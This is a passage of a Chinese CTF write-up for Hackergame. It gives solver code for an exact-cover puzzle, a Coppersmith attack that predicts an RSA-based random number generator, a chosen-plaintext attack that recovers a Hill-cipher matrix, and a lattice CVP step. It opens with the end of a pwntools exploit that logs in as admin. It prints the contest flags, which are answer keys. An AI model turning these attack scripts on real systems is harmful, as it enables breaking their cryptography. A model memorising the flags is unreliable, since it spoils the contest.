
log.info(f'credential: {credential}')

sh.sendlineafter(b'Choice: ', b'2')
sh.sendlineafter(b'credential: ', credential.encode())

sh.recvuntil(b'Hello, admin!\n')

print(sh.recvline().decode())

sh.close()
```

## 小 Z 的谜题

这道题出的很好我很喜欢，思维难度也有，能够把问题写成这样的代码也确实很强。

首先，先给出本道题描述的问题，即：将 16 个长方体放在一个 5x5x5 的立方体中，限制了每个方块的形状和数量。

有这样的前提后我们看一下代码描述了什么：

```py
# 边长为 5
bound = 5
# 每个长方体的形状是什么
constraints = ((1, 1, 3), (1, 2, 2), (1, 2, 4), (1, 4, 4), (2, 2, 2), (2, 2, 3))
# 每个长方体的数量是多少
count = [3, 4, 2, 2, 2, 3]
```

首先，对于 16 个方块，都需要放在 5x5x5 的立方体中：

```py
for i in range(num_constraints):
    for j in range(num_dims):
        for k in range(3):
            if k == 2:
                arrange[i][j][k] = -1
            else:
                number = int(next(s))
                assert 0 <= number <= bound
                arrange[i][j][k] = number

print('Stage 0 passed')
```

之后，这些长方体必须有序得被输入：

```py
assert arrange == list(sorted(arrange))

print('Stage 1 passed')
```

再之后，这些长方体互相不存在覆盖关系：

```py
for i in range(num_constraints):
    for j in range(num_constraints):
        if i == j:
            continue
        assert any((arrange[i][k][1] <= arrange[j][k][0] or arrange[j][k][1] <= arrange[i][k][0]) for k in range(num_dims))

print('Stage 2 passed')
```

最后，这些长方体满足数量限制：

```py
for i in range(num_constraints):
    for t in range(len(constraints)):
        if tuple(sorted([arrange[i][j][1] - arrange[i][j][0] for j in range(num_dims)])) == constraints[t]:
            count[t] -= 1
            break

assert not any(count)

print('Stage 3 passed')
```

然后计算分数：这一算法的结果近似等价于所有方块对 `x = -1`，`y = -1` 和 `z = -1` 三个平面的投影点，加上他们本身的顶点的数量，近似是因为还有些在三面的交线上。

```py
score = len(set((x, y, z) for i in range(num_constraints) for x, y, z in itertools.product(*arrange[i])))

if score >= 157:
    print(open('/flag3').read())
elif score <= 136:
    print(open('/flag2').read())
else:
    print(open('/flag1').read())
```

在理解了这个问题之后，我隐约觉得有点像俄罗斯方块、数独之类的，遂搜索得到了 “精确覆盖” 问题，并得知了舞蹈链和 X 算法。

……这个算法大量使用链表，于是我还在纠结用 python、rust 都挺烦的……

最终选择去洛谷上偷了个 OI 代码，不得不说，现在看 OI 的代码真是折磨……

将数量限制也作为 DFS 条件的一部分，可以得到如下代码：

```cpp
bool dance(int k) {
    if (head.L == (&head)) {
        if (k != 16)
            return false;

        cout << "[";
        for (int i = 0; i < k - 1; i++) {
            cout << ans[i] << ", ";
        }

        cout << ans[k - 1] << "]" << endl;
        return true;
    }
    int INF = (1 << 30), c = -1;
    for (DLXnode *ptr = head.L; ptr != (&head); ptr = ptr->L) {
        if (sz[ptr->c] < INF) {
            INF = sz[ptr->c];
            c = ptr->c;
        }
    }
    cover(c);
    DLXnode *ptr;

    for (ptr = col[c].D; ptr != (&col[c]); ptr = ptr->D) {
        if (limit[limit_map[ptr->r]] == 0) {
            continue;
        }

        DLXnode *rc;
        ptr->R->L = ptr;
        for (rc = ptr->L; rc != ptr; rc = rc->L) {
            cover(rc->c);
        }

        ptr->R->L = ptr->L;
        ans[k] = ptr->r;
        limit[limit_map[ptr->r]]--;

        dance(k + 1);

        limit[limit_map[ptr->r]]++;
        ptr->L->R = ptr;
        for (rc = ptr->R; rc != ptr; rc = rc->R) {
            re(rc->c);
        }
        ptr->L->R = ptr->R;
    }
    re(c);
    return false;
}

int main() {
    freopen("in.txt", "r", stdin);
    freopen("out.txt", "w", stdout);
    cin >> n >> m >> l;

    init(m, n);
    int sr;

    for (int i = 0; i < l; i++) {
        cin >> limit[i];
    }

    for (int i = 0; i < m; i++) {
        cin >> limit_map[i];
        for (int j = 0; j < n; j++) {
            cin >> sr;
            if (sr == 1) {
                addnode(i, j);
            }
        }
    }

    dance(0);
    return 0;
}
```

参考实现：[题解 P4929 【模板】舞蹈链（DLX）](https://www.luogu.com.cn/blog/Setsugesuka/solution-p4929)

之后进行数据预处理，构造为 OI 习惯的输入形式，并生成一些小规模的测试用例。

```py
from itertools import permutations


def check_block(block, i, j, k, col_unit):
    return i + block[0] <= col_unit and j + block[1] <= col_unit and k + block[2] <= col_unit


def gen_rows(blocks, col_unit):
    rows = set()

    for idx, block in enumerate(blocks):
        for i in range(col_unit):
            for j in range(col_unit):
                for k in range(col_unit):
                    for b in permutations(block):
                        if check_block(b, i, j, k, col_unit):
                            rows.add(((i, j, k), b, idx))

    return rows

def pos_block_to_01(row, col_unit):
    # convert the position of the block to 0-1
    bits = [0] * (col_unit ** 3)
    pos, block, _ = row
    # pos = start position of the block, from (0,0,0) to (5,5,5)
    # block = size of the block
    # record bits means the block is placed in the position
    # from (0,0,0) to (4,4,4), different from pos
    # because the bits means a small cube, not a position
    for i in range(pos[0], pos[0] + block[0]):
        for j in range(pos[1], pos[1] + block[1]):
            for k in range(pos[2], pos[2] + block[2]):
                # print(f"i={i}, j={j}, k={k} for block {block}")
                bits[i * (col_unit ** 2) + j * col_unit + k] = 1

    return bits

def gen_files(fname, col_unit, blocks, limit):
    col_num = col_unit ** 3
    tot_vol = 0
    for i in range(len(blocks)):
        tot_vol += (blocks[i][0] * blocks[i][1] * blocks[i][2]) * limit[i]
    assert tot_vol == col_num

    rows = gen_rows(blocks, col_unit)
    rows = sorted(list(rows))

    res = [(row, pos_block_to_01(row, col_unit)) for row in rows]

    with open(f'{fname}.in.txt', 'w') as f:
        f.write(str(col_num) + ' ' + str(len(res)) +
                ' ' + str(len(limit)) + '\n')
        f.write(' '.join(map(str, limit)) + '\n')
        for row in res:
            f.write(str(row[0][2]) + ' ')
            f.write(' '.join(map(str, row[1])))
            f.write('\n')

    with open(f'{fname}.map.txt', 'w') as f:
        for idx, row in enumerate(rows):
            f.write(str([idx, row[0], row[1], row[2]]) + '\n')

blocks = [(1, 1, 3), (1, 2, 2), (1, 2, 4), (1, 4, 4), (2, 2, 2), (2, 2, 3)]
limit = [3, 4, 2, 2, 2, 3]

gen_files('5x5x5', 5, blocks, limit)

blocks = [(1, 1, 2), (1, 1, 3)]
limit = [9, 3]

gen_files('3x3x3', 3, blocks, limit)

blocks = [(1, 1, 2)]
limit = [4]

gen_files('2x2x2', 2, blocks, limit)
```

这个程序会产生巨量的可行解（2min 时间输出文件为 10MB），之后对于这个数据输出进行筛选，得到需要的解：

```py
import itertools

data = [eval(i) for i in open('out.txt', 'r').readlines()]
maps = [eval(i) for i in open('5x5x5.map.txt', 'r').readlines()]

def format_str(d):
    d = list(sorted(d))
    result = ""
    for i in d:
        for j in i:
            result += str(j[0]) + str(j[1])
    return result


flags = [False] * 3

for co in data:
    choice = [maps[i] for i in co]
    lines = [[[item[1][i], item[1][i] + item[2][i], -1]
              for i in range(3)] for item in choice]
    score = len(set((x, y, z) for i in range(16)
                    for x, y, z in itertools.product(*lines[i])))

    if score >= 157 and not flags[0]:
        print(score, format_str(lines))
        flags[0] = True

    elif score <= 136 and not flags[1]:
        print(score, format_str(lines))
        flags[1] = True

    elif not flags[2]:
        print(score, format_str(lines))
        flags[2] = True

    if all(flags):
        break
```

很快就能得到三个：

```log
138 022335023435030213030235032413034545040401044504232435343414350213350235352315353545450301453504
136 022434022445030213030235032413034545040401044504232435343414350213350235352315353545450301453504
157 012415014525020235030213040401044502133525143412152315250235350113351213353524353545450301453502
```

**`flag{G0og1e_1s_a1l_y0u_n3ed_5c3bd816b2}`**
**`flag{DFS_A1g0ri7hm_1s_u5efu1_58e68f15a4}`**
**`flag{Knuths_A1g0ri7hm_X_1s_p0w3rful_051b0574a1}`**

## 黑客马拉松

这道题的第二问显然要比第一问简单。

### 一発勝負

先考虑它描述了一个什么问题：对于一个标准的 RSA 过程，考虑

```py
k = 928
state = state >> k
state = pow(state, e, N)
what_you_know = int(state) & ((1 << k) - 1)

assert state == int(input("guess: "))
```

也即对于 $c = m^e \bmod N$，我们已经知道了 $N, e$ 和 $c$ 的低 $k$ 位，求 $m$。

而同时我们还知道：$m$ 只有低 $1024 - 928 = 96 \ bits$，且 $c$ 只有高 $96 \ bits$ 是未知的。

利用多元的 CopperSmith 方法，我们需要得到一个 $f(x, y)$，使得 $f(x, y) = 0 \bmod N$。

不妨考虑构造一个 $e = -3$，此时 $e$ 在模 $\phi$ 的意义下是一个很大的数，且能满足题目对于逆元的要求。

而此时我们考虑前式，有：

$$
\begin{aligned}
c = m^e \bmod N &\Rightarrow c \times m^{-e} = 1 \bmod N \\
&\Rightarrow c \times m^{-e} - 1 = 0 \bmod N \\
\end{aligned}
$$

对于我们选取的 $e = -3$ 而言，我们已知道 $c_h$，可以得到：

$$ f(m, c_h) = (c_h \ll k + c_l) x^3 - 1 \bmod N $$

对这一方程进行多元 CopperSmith 计算，可以得到一组小根，也就是 $m$ 和 $c_h$ 的值。

由于多元 CopperSmith 在 Sage 中没有实现，所以需要找个[轮子](https://github.com/defund/coppersmith/blob/master/coppersmith.sage)：

```py
def get_mm_ch(cl):
    F = PolynomialRing(Zmod(N), names=('m', 'hc',))
    (m, ch,) = F._first_ngens(2)
    po = 1 << k
    g = m ** 3 * (ch * po + cl) - 1
    return small_roots(g, [bound, bound], 3, 4)

lc = ... # low k bits of c
m, ch = get_mm_ch(cl)[0]
guess = pow(m, e, N)
```

**`flag{บsE_hД5h_0Я_5yMmEtrI¢_Cipher_ƒoЯ_C§pЯNG}`**

### 教练，有人抢跑！

顺着第二问的思路可以去考虑第一问的问题了：

```py
k = 928
for _ in range(100):
    state = pow(state, e, N)
    randomNums.append(int(state) & ((1 << k) - 1))
    states.append(state)

print(randomNums)
assert state == int(input("guess: "))
```

在每两轮的迭代中，我们能够得到一组 $c_l, m_l$ 使得：

$$
\begin{aligned}
& c_h \ll k + c_l = (m_h \ll k + m_l)^e \bmod N \\
\Rightarrow \ & (c_h \ll k + c_l) \times (m_h \ll k + m_l)^{-e}  - 1= 0 \bmod N \\
\end{aligned}
$$

这种情况下，我们将问题也变为了一个多元的 CopperSmith 问题，需要求解的小根只有 $96 \ bits$。

可以列出如下的方程：

$$ f(m_h, c_h) = (c_h \ll k + c_l) \times (m_h \ll k + m_l)^{-e} - 1 \bmod N $$

使用同样的方法进行求解，不过我们只需要最后的一组 $m_l$ 和 $c_l$ 的值即可。

```py
def get_mh_ch(ml, cl):
    F = PolynomialRing(Zmod(N), names=('mh', 'ch',))
    (mh, ch,) = F._first_ngens(2)
    po = 1 << k
    g = (ch * po + cl) * (mh * po + ml) ** 3 - 1
    return small_roots(g, [bound, bound], 3, 6)

ml, cl = ... # low k bits of m and c
mh, ch = get_mh_ch(ml, cl)[0]
m = (mh << k) + ml
guess = pow(m, e, N)
```

PS：不得不说这两问的 flag 好丑啊（

**`flag{rsA_PЯnG_CoULD_b٤_ß4ckDo٥Я٤D}`**

## 不可加密的异世界 2

### 希尔混淆

这道题拿到题目之后的第一直觉是对于任意的 $a > 0$，构造 $b = a \oplus 1$，那么可以得到对于任意 $c > 0$，有 $\text{abs}(c \oplus a - c \oplus b) = 1$

也就是说，当我们得知 $c \oplus a$ 和 $c \oplus b$ 的大小关系的时候，也即下式中 $a_k \oplus b_k \oplus 1 > a_k \oplus b_k$ 时，可以构造出形如：

$$
H \left(\begin{bmatrix} a_1\\ a_2\\ \vdots \\ a_k\\ \vdots\\ a_n \\ \end{bmatrix} \oplus
\begin{bmatrix} b_1\\ b_2\\ \vdots \\ b_k \oplus 1 \\ \vdots\\ b_n \\ \end{bmatrix}\right) -
H \left(\begin{bmatrix} a_1\\ a_2\\ \vdots \\ a_k\\ \vdots\\ a_n \\ \end{bmatrix} \oplus
\begin{bmatrix} b_1\\ b_2\\ \vdots \\ b_k \\ \vdots\\ b_n \\ \end{bmatrix}\right) =
H \begin{bmatrix} 0 \\ 0 \\ \vdots \\ 1 \\ \vdots\\ 0 \\ \end{bmatrix} = H_k
$$

这里的 $H_k$ 表示的是矩阵 $H$ 的第 $k$ 列，也就是说，我们可以通过这种方式得到矩阵 $H$ 的一列。下面基于这种基本思路构造整个矩阵。

注意我们上述讨论的前提都是我们能够得知一位的大小关系，但是在这道题中，这些大小关系是随机的，这种随机会增加我们查询的成本，因此需要关注到另一点：被加密的明文是 ASCII 码，也就是说，我们可以保证每个字节的最高位都是 0，这样我们就可以通过直接的构造来得到这一信息。

$$
H \left(\begin{bmatrix} a_1\\ a_2\\ \vdots \\ a_k\\ \vdots\\ a_n \\ \end{bmatrix} \oplus
\begin{bmatrix} b_1\\ b_2\\ \vdots \\ 128 \\ \vdots\\ b_n \\ \end{bmatrix}\right) -
H \left(\begin{bmatrix} a_1\\ a_2\\ \vdots \\ a_k\\ \vdots\\ a_n \\ \end{bmatrix} \oplus
\begin{bmatrix} b_1\\ b_2\\ \vdots \\ 0 \\ \vdots\\ b_n \\ \end{bmatrix}\right) =
H \begin{bmatrix} 0 \\ 0 \\ \vdots \\ 128 \\ \vdots\\ 0 \\ \end{bmatrix} = H_k ^ {128} \bmod 257
$$

这时候得到的结果需要经过通过在模 257 下求 128 次方的原像，得到：$ H_k = h_{hz} ^ {255} = (H_k ^ {128}) ^ {255} \bmod 257$

通过这一的遍历 256 轮后，我们就能得到**基本**全部的矩阵信息，但是这道题目坑就坑在结果向量中的 0 存在差异性：可能是 0 或者是 256。

如果对于两次查询的结果 $H (a \oplus b_{128}) = h_h$ 和 $H (a \oplus b_{0}) = h_z$ 中均不存在 0，则可以正确得到结果 $h_k$，否则，我们需要更多的信息，并记录此差值为 $h_{hz} = h_{h} - h_{z}$

不妨考虑使得第三个向量中的第 $k$ 位为 `0b01000000`，记做 $b_{64}$，此时我们可以尝试得到 $H (a \oplus b_{64}) = h_t$，进而得到 $h_{tz} = h_t - h_z$ 与 $h_{zt} = h_z - h_t$。

当其中一个的第 $k$ 位差值为 64 时，我们就可以利用它来得到 $ H_k = (H_k ^ {64}) ^ {253} \bmod 257$。

可以证明，是否为 0 对于 $H_k$ 的大部分求解没有影响，此时我们还可以反过来利用 $h_{hz}$ 与 $h_{zt}$ 及 $h_{hz}$ 二者的相似度来确认原始向量的第 7 比特是什么，进而还能依据此信息，根据 $h_{ht} = h_h - h_t$，从而得到另一个 $H_k$ 的参考值：

$$
H_k = \left\{\begin{matrix}
h_{ht} ^ {253} ,& \text{if } h_{tz}^{253} \text{ looks like } h_{hz} ^ {255}, & \text{bit 7} = 0 \\
\\
h_{ht} ^ {170} ,& \text{if } h_{zt}^{253} \text{ looks like } h_{hz} ^ {255}, & \text{bit 7} = 1
\end{matrix}\right.
$$

我们可以假设上述三个 $h_h, h_t, h_z$ 之间同一个位置总是不同时为 0，这样我们就可以通过参考三个结果进行互相修正，从而得到准确的 $H_k$。

实际情况下，这样的概率很小，我们可以通过重新构造、重新查询三个向量的方式获取更多的信息，最终得到 $H_k$。

```py
def dump_matrix(sh, n=128):
    pwnlog.info('dumping matrix...')

    mat = []

    vector = np.random.randint(0, 127, size=(n, 1), dtype=np.uint8)
    vec_ans = commvec(sh, vector)

    bar = tqdm(range(n))
    for i in bar:
        bar.set_description(f"dumping matrix... {i} @ {req_times}")
        retry = 0
        while True:
            base = np.random.randint(0, 127, size=(n, 1), dtype=np.uint8)
            zero = base.copy()
            high = base.copy()

            high[i] = 0b10000000 + retry
            zero[i] = 0b00000000 + retry

            high_ans = commvec(sh, high)
            zero_ans = commvec(sh, zero)

            succ, result = check_stage_1(high_ans, zero_ans)

            if succ:
                mat.append(result)
                break

            # need more test to determine the result
            test = base.copy()
            test[i] = 0b01000000 + retry
            test_ans = commvec(sh, test)

            succ, result = check_stage_2(high_ans, zero_ans, test_ans)

            if succ:
                mat.append(result)
                break

            retry += 1

    pwnlog.info(f"total requests: {req_times}")
    mat = np.matrix(np.array(mat).reshape(n, n))
    return mat, vector, vec_ans

def check_stage_1(high, zero):
    high_guess = try_get_row(high, zero, 255)
    if sum(high == 0) == 0 and sum(zero == 0) == 0:
        return True, high_guess
    return False, None

def check_stage_2(high, zero, test):
    need_retry = False

    high_guess = try_get_row(high, zero, 255)

    # inverse(64, 257) = 253

    # 0b01 ^ 0b01 -> 0b00 / 0b00 ^ 0b01 -> 0b01
    # while the input is 0b01, zero - test
    zt_guess = try_get_row(zero, test, 253)

    # 0b01 ^ 0b00 -> 0b01 / 0b00 ^ 0b00 -> 0b00
    # while the input is 0b00, test - zero
    tz_guess = try_get_row(test, zero, 253)

    # use_tz means the sixth bit is 1
    use_tz = get_nearest(high_guess, tz_guess, zt_guess)

    if use_tz:
        # inverse(64, 257) = 253
        ht_guess = try_get_row(high, test, 253)
    else:
        # inverse(192, 257) = 170
        ht_guess = try_get_row(high, test, 170)

    high_zeros = np.where(high == 0)[0]
    zero_zeros = np.where(zero == 0)[0]
    test_zeros = np.where(test == 0)[0]

    # check if there are two zero in the same position
    high_set = set(high_zeros)
    zero_set = set(zero_zeros)
    test_set = set(test_zeros)

    if len(high_set & zero_set) + len(high_set & test_set) + len(zero_set & test_set) > 0:
        return False, None

    for pos in high_zeros:
        if use_tz:
            high_guess[pos] = tz_guess[pos]
        else:
            high_guess[pos] = zt_guess[pos]

    for pos in zero_zeros:
        high_guess[pos] = ht_guess[pos]

    return True, high_guess

def try_get_row(a, b, inv):
    return ((a - b) * inv) % 257

def test_pair(high_guess, ga, gb):
    return sum(ga - high_guess) == 0 or sum(gb - high_guess) == 0

def get_nearest(target, a, b):
    return sum(abs(a - target)) < sum(abs(b - target))
```

经过测试，上述代码总是能在约 370 次请求中得到完整的矩阵。

之后求逆后，就可以得到原始的矩阵，进而得到原始的向量，得到 flag。

```py
def verify(mat, vec, enc_flag):
    ring = Zmod(257)
    smat = matrix(ring, mat.T)

    if not smat.is_invertible():
        return False, None, None

    rev = smat ** (-1)
    flag_enc = vector(ring, enc_flag)
    dec = vector(ZZ, rev * flag_enc) % 256
    dec = np.array(dec)
    res = bytes([i ^ j for i, j in zip(dec, vec.reshape(-1))])

    print("res: ", res)

    return True, smat, res
```


**`flag{G0od_ma7hem5tical_f0undat1on_lin3ar_al9eBra_makes_sense_2cf6937397}`**

### 希尔之核

在得到完整的矩阵之后，第二个问题也就是：

$$ Hx = x \Rightarrow (H - I)x = 0 \bmod 257 $$

根据 Copilot 的解释，求解这样的 $x$ 实际上就是求解矩阵 $H - I$ 的 kernel，因此可以直接写出代码：

```py
def find_vectors(H):
    # 创建一个模 257 的环
    Z257 = IntegerModRing(257)
    # 创建一个在模 257 的环上的矩阵
    H_Z257 = matrix(Z257, H)
    # 计算 A - I
    I = matrix.identity(H_Z257.nrows())
    H_minus_I = H_Z257 - I
    # 求解 (A - I)x = 0
    solution = H_minus_I.right_kernel().basis()
    return solution
```

**`flag{solving_linear_equations_1s_so_ea5y!!_*^*_amazing_rank_**><**_88924a27af}`**

### 希尔之秘

最后，我们上一步中的 $ker (H - I)$ 是 128 个线性无关的向量，则这一问的目标可以转化为在这 128 个向量构成的模 257 的格中，找到距离 128 唯向量 $[80, \dots, 80]^T$ 最近的向量。

也就是转化为格的 CVP 问题。

这里直接参考 mcfx 在 [灯，等灯等灯](https://github.com/GZTimeWalker/hackergame2021-writeups/blob/master/players/mcfx/writeup.md#%E4%BB%A3%E7%A0%81) 中提到的方法：

```py
def cvp(vectors):
    mat = [[int(j) for j in i] + [0] for i in vectors]

    for i in range(128):
        arr = [0] * 129
        arr[i] = 257
        mat.append(arr)

    mat.append([-0x50] * 128 + [0xdead])

    # ans = Matrix(mat).LLL() # not very good
    ans = Matrix(mat).BKZ()

    n = len(mat)

    for i in range(n):
        if ans[i][128]:
            for j in range(128):
                mat[-1][j] = ans[i][j] - mat[-1][j]
            break

    return mat[-1][:128]

def check(vec):
    svec = vector(Zmod(257), vec)
    return all(0x20 <= i < 0x79 for i in vec) and smat * svec == svec
```

**`flag{lattice_reduction_makes_everything_short_and_babai_finds_things_as_near_as_you_want_ade4bc1fa6}`**

## 后记

又是一年捏，博客慢点更新，这份先扔到仓库啦。玩 Hackergame 玩的！
